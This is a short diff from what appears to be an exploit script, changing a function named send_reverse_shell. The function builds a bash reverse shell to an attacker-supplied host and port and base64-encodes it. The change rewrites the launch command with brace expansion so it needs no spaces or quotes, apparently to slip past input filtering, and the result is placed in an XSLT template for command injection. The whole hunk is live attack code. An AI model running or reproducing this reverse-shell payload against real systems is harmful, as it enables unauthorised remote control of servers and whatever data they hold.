@@ -219,7 +219,7 @@ def send_reverse_shell(session, base_url, token, uuid, lhost, lport):
     """
     inner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     b64 = base64.b64encode(inner.encode()).decode()
-    cmd = f'nohup sh -c "printf {b64}|base64 -d|bash" >/dev/null 2>&1 &'
+    cmd = f"nohup bash -c {{echo,{b64}}}|{{base64,-d}}|bash >/dev/null 2>&1 &"
 
     name = rand_name("rs")
     xsl = XSLT_CMD_TEMPLATE.replace("{CMD}", cmd)
